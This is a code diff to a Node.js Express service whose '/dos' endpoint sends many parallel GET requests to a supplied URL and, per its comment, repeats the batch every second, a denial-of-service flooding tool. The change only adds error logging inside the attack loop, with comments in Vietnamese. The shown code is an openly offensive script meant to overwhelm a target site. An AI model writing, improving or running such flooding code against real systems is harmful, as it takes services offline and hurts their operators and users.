@@ -37,7 +37,13 @@ app.post('/dos', (req, res) => {
 
             const attackPromises = [];
             for (let i = 0; i < threads; i++) {
-                attackPromises.push(axios.get(url).catch(() => null)); // Bắt lỗi nếu có
+                attackPromises.push(
+                    axios.get(url)
+                        .catch((error) => {
+                            console.error(`Error making request to ${url}:`, error.message);
+                            return null; // Đảm bảo không có lỗi bị ném ra
+                        })
+                );
             }
             Promise.all(attackPromises).then(() => {
                 // Gửi yêu cầu xong thì đợi 1 giây và gọi lại hàm này
@@ -51,4 +57,4 @@ app.post('/dos', (req, res) => {
 
 app.listen(process.env.PORT || 8080, () => {
     console.log(`Server is running on port ${process.env.PORT || 8080}`);
-}); 
+});
